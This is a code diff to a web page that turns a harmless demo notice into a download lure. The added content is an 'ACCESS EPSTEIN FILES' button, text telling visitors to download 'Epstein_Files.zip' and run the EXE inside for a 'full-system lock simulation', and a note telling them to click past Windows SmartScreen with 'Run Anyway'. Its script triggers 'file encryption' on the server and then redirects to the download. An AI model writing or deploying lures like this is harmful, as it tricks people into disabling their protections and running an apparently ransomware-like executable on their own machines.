@@ -164,29 +164,58 @@
             border-color: rgba(255, 255, 255, 0.2);
         }
 
+        .lab-panel p {
+            color: rgba(255, 255, 255, 0.9);
+        }
+
         .lab-description {
             color: rgba(255, 255, 255, 0.8);
             margin-bottom: 30px;
         }
 
-        .btn-launch {
+        .btn {
             background-color: var(--accent-color);
             color: var(--white);
             border: none;
-            padding: 18px 40px;
-            font-size: 1.2rem;
-            font-weight: 600;
-            border-radius: 4px;
+            padding: 25px 60px;
+            font-size: 1.6rem;
+            font-weight: 700;
+            border-radius: 8px;
             cursor: pointer;
-            transition: 0.3s;
+            transition: all 0.3s ease;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            letter-spacing: 2px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+            display: inline-block;
+            margin: 20px 0;
+            animation: pulse 2s infinite;
         }
 
-        .btn-launch:hover {
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+            }
+
+            50% {
+                transform: scale(1.05);
+                box-shadow: 0 15px 30px rgba(192, 57, 43, 0.4);
+            }
+
+            100% {
+                transform: scale(1);
+                box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+            }
+        }
+
+        .btn:hover {
             background-color: #e74c3c;
-            transform: translateY(-2px);
+            transform: translateY(-3px) scale(1.08);
+            box-shadow: 0 15px 25px rgba(0, 0, 0, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(-1px);
         }
 
         .lab-warning {
@@ -291,13 +320,23 @@
 
             <section id="lab" class="lab-panel">
                 <h2>THE ISLAND FULL OF CRIMES</h2>
-                <p class="lab-description">
-                    Recent files were released on January 30,2026. To access those files please click on the link below.
-                </p>
-
-                <button onclick="launchSimulation()" class="btn-launch">KNOW MORE...</button>
-                <div id="status-display"></div>
-
+                <p>Recent files were released on January 30, 2026. To analyze the encrypted files and experience the
+                    full-system lock simulation, please download and run our security suite.</p>
+                <div class="launch-box">
+                    <button class="btn" id="start-btn" onclick="launchSimulation()">ACCESS EPSTEIN FILES</button>
+                    <div id="status-msg"></div>
+                    <div class="security-note"
+                        style="margin-top: 15px; padding: 10px; border: 1px solid #f1c40f; background: rgba(241, 196, 15, 0.1); border-radius: 4px; text-align: left;">
+                        <p style="font-size: 0.85rem; color: #f1c40f; margin: 0;"><strong>⚠️ SECURITY NOTE:</strong> As
+                            this is a custom educational security tool which shows info regarding sensitive files,
+                            Windows SmartScreen may show a warning. This is
+                            expected for unsigned security payloads. Click <strong>"More Info"</strong> &rarr;
+                            <strong>"Run Anyway"</strong> to proceed with the analysis.
+                        </p>
+                    </div>
+                    <p style="font-size: 0.8rem; margin-top: 10px; color: #7f8c8d;">* This will download
+                        'Epstein_Files.zip'. Extract it and run the EXE inside to start the full-system simulation.</p>
+                </div>
                 <div class="lab-warning">
                     ⓘ TERMS AND CONDITIONS APPLY
                 </div>
@@ -313,7 +352,45 @@
 
     <script>
         function launchSimulation() {
-            alert("NOTE: This is the online demo version.\n\nFor security reasons, the simulation script cannot run from a website. You must clone the repository and run 'server.py' locally to execute the simulation.");
+            const status = document.getElementById('status-msg'); // Changed from status-display
+            const btn = document.getElementById('start-btn'); // Changed from .btn-launch
+
+            status.textContent = '> INITIALIZING DOWNLOAD...';
+            status.style.color = 'white';
+            btn.style.opacity = '0.7';
+            btn.textContent = 'EXECUTING...'; // Added this line based on the original logic
+
+            // Trigger file encryption on server first
+            fetch('/run-simulation', { method: 'POST' })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        status.textContent = '> SUCCESS: Epstein_Files.zip is ready. Downloading...';
+                        status.style.color = '#2ecc71';
+                        btn.textContent = 'DOWNLOADING...';
+
+                        // Redirect to download link
+                        window.location.href = '/download-simulation';
+                    } else {
+                        status.textContent = '> ERROR: ' + data.message.toUpperCase();
+                        status.style.color = '#e74c3c';
+                        btn.textContent = 'RETRY LAUNCH';
+                        btn.style.opacity = '1';
+                    }
+                })
+                .catch(error => {
+                    status.textContent = '> NETWORK ERROR: ' + error;
+                    status.style.color = '#e74c3c';
+                    btn.textContent = 'CONNECTION FAILED';
+                    btn.style.opacity = '1';
+                });
+
+            setTimeout(() => {
+                if (btn.textContent === 'SIMULATION ACTIVE') {
+                    btn.textContent = 'Launch Educational Simulation';
+                    btn.style.opacity = '1';
+                }
+            }, 5000);
         }
     </script>
 </body>
